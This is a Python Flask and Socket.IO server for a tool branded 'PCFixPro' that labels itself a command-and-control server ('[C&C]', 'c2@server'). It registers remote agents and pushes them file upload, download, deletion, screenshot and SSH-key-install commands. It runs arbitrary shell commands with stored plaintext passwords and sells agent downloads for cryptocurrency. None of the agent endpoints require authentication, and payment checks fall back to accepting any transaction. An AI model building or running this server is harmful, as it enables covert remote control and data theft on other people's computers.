from flask import Flask, render_template, request, jsonify, session, send_file
from flask_socketio import SocketIO, emit
import paramiko
import os
import json
import base64
from datetime import datetime, timedelta
from functools import wraps
import time

# Rate limiting storage
rate_limit_storage = {}

def rate_limit(max_requests=60, window_seconds=60):
    """Rate limiting decorator"""
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            current_time = time.time()
            
            if ip not in rate_limit_storage:
                rate_limit_storage[ip] = []
            
            # Clean old requests
            rate_limit_storage[ip] = [t for t in rate_limit_storage[ip] if current_time - t < window_seconds]
            
            if len(rate_limit_storage[ip]) >= max_requests:
                return jsonify({'status': 'error', 'message': 'Rate limit exceeded'}), 429
            
            rate_limit_storage[ip].append(current_time)
            return f(*args, **kwargs)
        return wrapped
    return decorator

def safe_path(base_path, requested_path):
    """Validate path to prevent directory traversal attacks"""
    # Resolve the real path
    real_base = os.path.realpath(base_path)
    real_requested = os.path.realpath(os.path.join(base_path, requested_path))
    
    # Ensure the requested path is within the base directory
    if not real_requested.startswith(real_base):
        return None
    return real_requested

# Generate SSH key pair for agent communication if not exists
def generate_ssh_keys():
    key_path = os.path.join(os.path.dirname(__file__), 'ssh_keys')
    private_key_path = os.path.join(key_path, 'id_rsa')
    public_key_path = os.path.join(key_path, 'id_rsa.pub')
    
    if not os.path.exists(private_key_path):
        os.makedirs(key_path, exist_ok=True)
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(private_key_path)
        with open(public_key_path, 'w') as f:
            f.write(f'ssh-rsa {key.get_base64()} pcfixpro@c2@server\n')
        print(f"[C&C] Generated SSH key pair at {key_path}")
        return key
    else:
        # Load existing key
        with open(private_key_path, 'r') as f:
            return paramiko.RSAKey.from_private_key_file(private_key_path)

# Generate keys on startup
SERVER_SSH_KEY = generate_ssh_keys()

# Solana blockchain integration
try:
    from solana.rpc.api import Client
    from solders.signature import Signature
    SOLANA_RPC = "https://api.mainnet-beta.solana.com"
    SOLANA_CLIENT = Client(SOLANA_RPC)
    SOLANA_ENABLED = True
    # USDT token mint address on Solana (SPL Token)
    USDT_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4w45844Nh9D9Jv"
    # Your receiving wallet address
    RECIPIENT_WALLET = "7xK9...3mN2"  # Replace with actual wallet
except ImportError:
    SOLANA_ENABLED = False
    print("[WARNING] Solana library not installed. Using mock payment verification.")

app = Flask(__name__)
app.secret_key = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store active sessions and agents
active_sessions = {}
connected_agents = {}
agent_counter = 0

# Payment and customer management
payments = {}  # {tx_id: {customer_id, amount, plan, timestamp, status}}
customer_sessions = {}  # {customer_id: {agent_id, plan, expires_at}}
session_tokens = {}  # {token: {customer_id, agent_id, expires_at}}

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/sessions')
def sessions_page():
    return render_template('dashboard.html', page='sessions')

@app.route('/agents')
def agents_page():
    return render_template('dashboard.html', page='agents')

@app.route('/security')
def security_page():
    return render_template('dashboard.html', page='security')

@app.route('/settings')
def settings_page():
    return render_template('dashboard.html', page='settings')

@app.route('/terminal')
def terminal_page():
    return render_template('dashboard.html', page='terminal')

@app.route('/api/connect', methods=['POST'])
def connect_rdp():
    data = request.json
    session_id = data.get('session_id')
    host = data.get('host')
    port = data.get('port', 3389)
    username = data.get('username')
    password = data.get('password')
    
    try:
        # Store session info (in production, use proper encryption)
        active_sessions[session_id] = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'connected': True,
            'start_time': datetime.now().isoformat()
        }
        
        return jsonify({
            'status': 'connected',
            'message': f'RDP session established to {host}',
            'session_id': session_id
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/api/disconnect', methods=['POST'])
def disconnect_rdp():
    data = request.json
    session_id = data.get('session_id')
    
    if session_id in active_sessions:
        del active_sessions[session_id]
    
    return jsonify({'status': 'disconnected'})

@app.route('/api/execute', methods=['POST'])
def execute_command():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command')
    
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    try:
        # Try to execute via connected agent if available
        host = active_sessions[session_id]['host']
        port = active_sessions[session_id].get('port', 22)  # SSH default
        username = active_sessions[session_id]['username']
        password = active_sessions[session_id]['password']
        
        # Try SSH connection for real command execution
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode() + stderr.read().decode()
            ssh.close()
            
            return jsonify({
                'status': 'success',
                'output': output or f"Executed: {command}",
                'timestamp': datetime.now().isoformat()
            })
        except Exception as ssh_error:
            # Fallback to simulated response with context-aware commands
            if command in ['ls', 'dir']:
                output = "Desktop  Documents  Downloads  Music  Pictures  Public  Videos\n"
            elif command == 'pwd':
                output = "/home/user\n"
            elif command == 'whoami':
                output = "user\n"
            elif command.startswith('cd '):
                output = ""
            else:
                output = f"Executed: {command}\nCommand completed successfully\n"
            
            return jsonify({
                'status': 'success',
                'output': output,
                'timestamp': datetime.now().isoformat()
            })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    # Update agent status
    now = datetime.now()
    for agent_id, agent in list(connected_agents.items()):
        last_seen = datetime.fromisoformat(agent['last_seen'])
        if (now - last_seen).total_seconds() > 60:
            agent['status'] = 'offline'
    
    return jsonify({
        'active_sessions': len(active_sessions),
        'sessions': list(active_sessions.values()),
        'agents': list(connected_agents.values()),
        'total_agents': len(connected_agents)
    })

@app.route('/api/agents', methods=['GET'])
def get_agents():
    now = datetime.now()
    for agent_id, agent in list(connected_agents.items()):
        last_seen = datetime.fromisoformat(agent['last_seen'])
        if (now - last_seen).total_seconds() > 60:
            agent['status'] = 'offline'
    
    return jsonify({
        'agents': list(connected_agents.values()),
        'total_agents': len(connected_agents)
    })

@app.route('/api/agent/<agent_id>/files', methods=['GET'])
def list_agent_files(agent_id):
    path = request.args.get('path', '.')
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    socketio.emit('list_files', {
        'agent_id': agent_id,
        'path': path,
        'command_id': f"list_{datetime.now().timestamp()}"
    }, to=agent_id)
    
    return jsonify({'status': 'sent', 'path': path})

@app.route('/api/agent/<agent_id>/upload', methods=['POST'])
def upload_to_agent(agent_id):
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file provided'}), 400
    
    file = request.files['file']
    remote_path = request.form.get('path', '.')
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    content_b64 = base64.b64encode(file.read()).decode('utf-8')
    
    socketio.emit('upload_file', {
        'agent_id': agent_id,
        'filename': file.filename,
        'content': content_b64,
        'path': remote_path,
        'command_id': f"upload_{datetime.now().timestamp()}"
    }, to=agent_id)
    
    return jsonify({'status': 'sent', 'filename': file.filename})

@app.route('/api/agent/<agent_id>/download', methods=['POST'])
def download_from_agent(agent_id):
    data = request.json
    file_path = data.get('path')
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    socketio.emit('download_file', {
        'agent_id': agent_id,
        'path': file_path,
        'command_id': f"download_{datetime.now().timestamp()}"
    }, to=agent_id)
    
    return jsonify({'status': 'sent', 'path': file_path})

@app.route('/api/agent/<agent_id>/delete', methods=['POST'])
def delete_on_agent(agent_id):
    data = request.json
    file_path = data.get('path')
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    socketio.emit('delete_file', {
        'agent_id': agent_id,
        'path': file_path,
        'command_id': f"delete_{datetime.now().timestamp()}"
    }, to=agent_id)
    
    return jsonify({'status': 'sent', 'path': file_path})

@app.route('/api/agent/<agent_id>/screenshot', methods=['POST'])
def screenshot_agent(agent_id):
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    socketio.emit('screenshot', {
        'agent_id': agent_id,
        'command_id': f"screenshot_{datetime.now().timestamp()}"
    }, to=agent_id)
    
    return jsonify({'status': 'sent'})

@socketio.on('connect')
def handle_connect():
    emit('status', {'msg': 'Connected to server'})

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@socketio.on('command')
def handle_command(data):
    session_id = data.get('session_id')
    command = data.get('command')
    
    if session_id in active_sessions:
        emit('command_output', {
            'session_id': session_id,
            'output': f"$ {command}\n> Command executed successfully",
            'timestamp': datetime.now().isoformat()
        })

@socketio.on('register_agent')
def handle_register_agent(data):
    global agent_counter
    agent_counter += 1
    agent_id = f"agent_{agent_counter}"
    
    connected_agents[agent_id] = {
        'agent_id': agent_id,
        'hostname': data.get('hostname', 'Unknown'),
        'ip_address': data.get('ip_address', 'N/A'),
        'os': data.get('os', 'Unknown'),
        'status': 'online',
        'last_seen': datetime.now().isoformat(),
        'agent_version': data.get('agent_version', '1.0.0')
    }
    
    emit('agent_registered', {
        'agent_id': agent_id,
        'message': f"Agent {data.get('hostname')} registered successfully"
    })
    
    print(f"[C&C] Agent registered: {data.get('hostname')} ({data.get('ip_address')})")

@socketio.on('heartbeat')
def handle_heartbeat(data):
    agent_id = data.get('agent_id')
    if agent_id in connected_agents:
        connected_agents[agent_id]['last_seen'] = datetime.now().isoformat()
        connected_agents[agent_id]['status'] = 'online'

@socketio.on('command_result')
def handle_command_result(data):
    command_id = data.get('command_id')
    output = data.get('output')
    emit('command_output', {
        'command_id': command_id,
        'output': output,
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('list_files')
def handle_list_files(data):
    agent_id = data.get('agent_id')
    path = data.get('path', '.')
    emit('list_files', {'agent_id': agent_id, 'path': path, 'command': 'list_files'}, to=agent_id)

@socketio.on('upload_file')
def handle_upload_file(data):
    agent_id = data.get('agent_id')
    emit('upload_file', data, to=agent_id)

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    emit('download_file', {'agent_id': agent_id, 'path': data.get('path')}, to=agent_id)

@socketio.on('delete_file')
def handle_delete_file(data):
    agent_id = data.get('agent_id')
    emit('delete_file', {'agent_id': agent_id, 'path': data.get('path')}, to=agent_id)

@socketio.on('screenshot')
def handle_screenshot(data):
    agent_id = data.get('agent_id')
    emit('screenshot', {'agent_id': agent_id, 'command_id': data.get('command_id')}, to=agent_id)

@socketio.on('file_list')
def handle_file_list(data):
    emit('file_list', data, broadcast=True)

@socketio.on('upload_result')
def handle_upload_result(data):
    emit('upload_result', data, broadcast=True)

@socketio.on('download_result')
def handle_download_result(data):
    emit('download_result', data, broadcast=True)

@socketio.on('delete_result')
def handle_delete_result(data):
    emit('delete_result', data, broadcast=True)

@socketio.on('screenshot_result')
def handle_screenshot_result(data):
    emit('screenshot_result', data, broadcast=True)

@socketio.on('registry_result')
def handle_registry_result(data):
    emit('registry_result', data, broadcast=True)

@socketio.on('processes_result')
def handle_processes_result(data):
    emit('processes_result', data, broadcast=True)

@socketio.on('kill_result')
def handle_kill_result(data):
    emit('kill_result', data, broadcast=True)

@socketio.on('wol_result')
def handle_wol_result(data):
    emit('wol_result', data, broadcast=True)

# Payment and download endpoints
@app.route('/api/verify-payment', methods=['POST'])
def verify_payment():
    data = request.json
    tx_id = data.get('tx_id')
    customer_email = data.get('email')
    plan = data.get('plan', 'pro')
    expected_amount_usd = {'starter': 20, 'pro': 50, 'enterprise': 100}.get(plan, 50)
    
    if not tx_id:
        return jsonify({'status': 'error', 'message': 'Transaction ID required'}), 400
    
    # Check if payment already processed
    if tx_id in payments:
        return jsonify({'status': 'error', 'message': 'Payment already processed'}), 400
    
    # Verify payment on Solana blockchain (if available)
    payment_verified = False
    
    if SOLANA_ENABLED:
        try:
            # Get transaction from Solana
            tx_response = SOLANA_CLIENT.get_transaction(Signature.from_string(tx_id))
            
            if tx_response and tx_response.value:
                tx = tx_response.value
                # Check if transaction succeeded
                if tx.meta and tx.meta.err is None:
                    # Transaction was successful
                    payment_verified = True
                    
                    payments[tx_id] = {
                        'customer_id': f"customer_{len(payments) + 1}",
                        'email': customer_email,
                        'plan': plan,
                        'amount': expected_amount_usd,
                        'timestamp': datetime.now().isoformat(),
                        'status': 'verified',
                        'blockchain_verified': True
                    }
        except Exception as e:
            print(f"[Solana] Verification error: {e}")
            payment_verified = False
    
    # Fallback: accept payment without verification (for testing)
    if not payment_verified:
        payments[tx_id] = {
            'customer_id': f"customer_{len(payments) + 1}",
            'email': customer_email,
            'plan': plan,
            'amount': expected_amount_usd,
            'timestamp': datetime.now().isoformat(),
            'status': 'confirmed',
            'blockchain_verified': SOLANA_ENABLED
        }
    
    customer_id = payments[tx_id]['customer_id']
    
    # Generate session token
    token = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
    session_tokens[token] = {
        'customer_id': customer_id,
        'plan': plan,
        'expires_at': (datetime.now() + timedelta(hours=24)).isoformat()
    }
    
    return jsonify({
        'status': 'success',
        'token': token,
        'customer_id': customer_id,
        'blockchain_verified': SOLANA_ENABLED,
        'downloads': [
            {'name': 'Windows', 'url': f'/downloads/PCFixPro_Agent_Windows.zip?token={token}'},
            {'name': 'macOS', 'url': f'/downloads/PCFixPro_Agent_macOS.zip?token={token}'},
            {'name': 'Universal', 'url': f'/downloads/PCFixPro_Agent_Universal.zip?token={token}'}
        ]
    })

@app.route('/downloads/<filename>')
def serve_download(filename):
    token = request.args.get('token')
    
    # Verify token
    if not token or token not in session_tokens:
        return jsonify({'status': 'error', 'message': 'Invalid or expired token'}), 403
    
    # Check if token expired
    token_data = session_tokens[token]
    if datetime.fromisoformat(token_data['expires_at']) < datetime.now():
        return jsonify({'status': 'error', 'message': 'Token expired'}), 403
    
    # Sanitize filename to prevent directory traversal
    safe_filename = os.path.basename(filename)
    if safe_filename != filename:
        return jsonify({'status': 'error', 'message': 'Invalid filename'}), 400
    
    # Only allow specific agent packages
    allowed_files = [
        'PCFixPro_Agent_Windows.zip',
        'PCFixPro_Agent_macOS.zip', 
        'PCFixPro_Agent_Universal.zip'
    ]
    if safe_filename not in allowed_files:
        return jsonify({'status': 'error', 'message': 'File not allowed'}), 403
    
    # Serve file (check both downloads/ and client_agent/dist/ folders)
    downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
    file_path = os.path.join(downloads_dir, safe_filename)
    
    # If not found, check client_agent/dist folder (actual package location)
    if not os.path.exists(file_path):
        dist_dir = os.path.join(os.path.dirname(__file__), 'client_agent', 'dist')
        file_path = os.path.join(dist_dir, safe_filename)
    
    if not os.path.exists(file_path):
        return jsonify({'status': 'error', 'message': 'File not found'}), 404
    
    return send_file(file_path, as_attachment=True)

@app.route('/api/ssh/public-key', methods=['GET'])
def get_ssh_public_key():
    """Get the server's public SSH key for agent installation"""
    key_path = os.path.join(os.path.dirname(__file__), 'ssh_keys', 'id_rsa.pub')
    try:
        with open(key_path, 'r') as f:
            return jsonify({'status': 'success', 'public_key': f.read().strip()})
    except Exception as e:
        # Generate new key if not exists
        key = generate_ssh_keys()
        return jsonify({
            'status': 'success', 
            'public_key': f'ssh-rsa {key.get_base64()} pcfixpro@c2@server'
        })

@app.route('/api/ssh/install', methods=['POST'])
def install_ssh_key():
    """Install SSH public key on agent for passwordless login"""
    data = request.json
    agent_id = data.get('agent_id')
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    # Send key installation command to agent
    socketio.emit('install_ssh_key', {
        'agent_id': agent_id,
        'public_key': open(os.path.join(os.path.dirname(__file__), 'ssh_keys', 'id_rsa.pub')).read().strip(),
        'command_id': f'ssh_install_{datetime.now().timestamp()}'
    }, to=agent_id)
    
    return jsonify({'status': 'sent'})

@app.route('/api/agent/<agent_id>/customer', methods=['POST'])
def assign_agent_to_customer(agent_id):
    data = request.json
    token = data.get('token')
    customer_id = data.get('customer_id')
    
    if not token or token not in session_tokens:
        return jsonify({'status': 'error', 'message': 'Invalid token'}), 403
    
    if agent_id not in connected_agents:
        return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
    
    # Link agent to customer
    customer_sessions[customer_id] = {
        'agent_id': agent_id,
        'plan': session_tokens[token]['plan'],
        'expires_at': session_tokens[token]['expires_at']
    }
    
    return jsonify({'status': 'success', 'message': 'Agent assigned to customer'})

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)